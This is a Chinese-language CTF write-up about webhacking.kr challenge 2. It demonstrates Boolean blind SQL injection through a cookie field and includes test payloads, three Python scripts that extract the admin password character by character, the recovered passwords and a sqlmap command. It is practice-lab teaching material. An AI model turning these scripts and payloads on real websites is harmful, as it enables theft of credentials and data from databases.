---
title: webhacking ch2(Cookie 布尔盲注)
layout: post
categories: CTF
tags: CTF sql注入 
---

这是 `webhacking.kr` 上的第二题，有点难，在 cookie 上存在盲注，这里单独拿出来作为实例分析一下。

<!--more-->

## 0x01 基本分析

**这道题有点难，详细分析一下解题过程**

**1.首先查看源码可以 get 到管理员登录的地址，但是这里没有注入点**

**2.`board` 那里再点击一下可以看文章，但是也要密码，输入的地方也没有注入点**

**3.看源码里的时间戳的注释，那里是个暗示，同时你查看 cookie 看到 `time`字段，这一切都暗示在 cookie 这里可能存在注入点，这里要测试一下到底是否存在**

经测试这里过滤了 `#` ，所以注释符只能用`--+`

```
Cookie: time=1539219733 and 1=2--+;
回显
<!--2070-01-01 09:00:00-->

Cookie: time=1539219733 and 1=1--+;
回显
<!--2070-01-01 09:00:01-->
```

**可以看出这里是`布尔盲注`**

接下来我们就按照布尔盲注的套路来就可以了。



## 0x02 脚本解决

### 1. 猜数据库长度

```python
#encoding: utf-8
import requests
import string

rq = requests.session()

url = "http://webhacking.kr/challenge/web/web-02/index.php"

for i in range(30):
	payload = "1 and length(database())={} --+"
	param = payload.format(i)
	header={"Cookie":"time="+param+"; PHPSESSID=1d24b4534c024cf3abbd7678b150bd2a"}
	response = rq.get(url, headers=header)

	print(param)
	if "<!--2070-01-01 09:00:01-->" in response.text:
		print(i)
		break
#10
```

**这里从教条主义的角度来，按照我之前另一篇文章的套路一步步来完全是可以的（不过这里貌似`information` 字段被过滤了），但是这里我们可以从经验主义的角度来取巧的先尝试一下。我们猜测那个 `admin` 界面对应的表是 `admin` ，然后直接猜解它的 `password` 字段。**



### 2.猜目标数据的长度

```python 
#encoding: utf-8
import requests
import string

rq = requests.session()

url = "http://webhacking.kr/challenge/web/web-02/index.php"

for i in range(30):
	payload = "1 and (select length(password) from admin)={} --+"
	param = payload.format(i)
	header={"Cookie":"time="+param+"; PHPSESSID=1d24b4534c024cf3abbd7678b150bd2a"}
	response = rq.get(url, headers=header)

	print(param)
	if "<!--2070-01-01 09:00:01-->" in response.text:
		print(i)
		break
#10
```



### 3.猜解目标数据

```python
#encoding: utf-8
import requests
import string

rq = requests.session()

url = "http://webhacking.kr/challenge/web/web-02/index.php"
s = string.printable


target_pass = ""
target_pass_len = 10
for i in range(1, target_pass_len+1):
	left = 48
	right = 122
	mid = (left + right) // 2
	while left < right-1:
		payload = "1 and (ascii(substr((select password from admin),{},1)))>={} --+"
		param = payload.format(i, mid)
		header={"Cookie":"time="+param+"; PHPSESSID=1d24b4534c024cf3abbd7678b150bd2a"}
		response = rq.get(url, headers=header)
		
		print(param)
		if "<!--2070-01-01 09:00:01-->" in response.text:
			left = mid
		else:
			right = mid
		mid = (left + right) // 2
	target_pass += chr(left)
	print(target_pass)
print(target_pass)
#0nly_admin
```



### 4.后续操作

用密码去登录 `amdin` 页面可以得到新的密码`@dM1n__nnanual`(这个后面是解压密码)

再回到 `BOARD` 页面发现个新的字符串`FreeB0aRd`，这是一个新的表名，我们继续用之前的脚本来猜解`BOARD`的密码，得到`7598522ae`。

登录`BOARD` 页面得到 `__AdMiN__FiL2.zip` 文件，输入前面的解压密码便可以获得 `flag`，再去提交即可。





## 0x03 sqlmap 解决

```
python sqlmap.py -u "http://webhacking.kr/challenge/web/web-02/index.php" --dbms "mysql" --cookie "time=1; PHPSESSID=5357477fdfb7cc02bbe5e26f7622489d" -p "time" --current-db --level 2

-p 是指定 cookie 里的参数
--dbms 是指定数据库

回显
do you want to URL encode cookie values (implementation specific)? [Y/n] y
[22:22:31] [WARNING] heuristic (basic) test shows that Cookie parameter 'time' might not be injectable
```

我再这里并没有使用 sqlmap 检测成功，这里暂且留个坑在这里⭐️